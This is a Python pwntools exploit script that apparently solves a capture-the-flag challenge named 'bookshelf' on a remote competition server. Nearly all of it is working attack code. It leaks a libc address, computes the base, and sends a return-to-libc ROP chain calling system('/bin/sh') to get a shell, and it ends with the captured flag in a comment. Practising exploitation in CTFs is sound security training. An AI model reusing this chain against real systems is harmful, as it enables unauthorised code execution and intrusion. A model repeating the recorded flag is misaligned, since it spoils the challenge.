```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./bookshelf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

# p = process([exe.path])
p = remote('chal.pctf.competitivecyber.club', 4444)
gdb.attach(p, gdbscript = '''
b*0x0000000000401634
b*0x000000000040161e
c
''')
           
input()
    
for i in range(0, 9):
    p.sendline(b'2')
    p.sendline(b'2')
    p.sendline(b'y')

p.sendline(b'2')
p.sendline(b'3')
p.recvuntil(b'glory ')
libc_leak = int(p.recv(14), 16)
libc.address =  libc_leak - 0x80ed0
log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))
p.sendline(b'y')

p.sendline(b'1')
p.sendline(b'y')
p.sendline(b'a'*40)

p.sendline(b'3')

one_gadget = libc.address  + 0xebcf5
# 0xebcf1 0xebcf5 0xebcf8
pop_rdi = 0x000000000002a3e5 + libc.address
ret = 0x000000000040101a
payload = b'a'*0x38
# payload += p64(0x000000000040101a)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(ret)
payload += p64(libc.sym['system'])

p.sendline(payload)

#PCTF{r3t_2_libc_pl0x_52706196}

p.interactive()

```
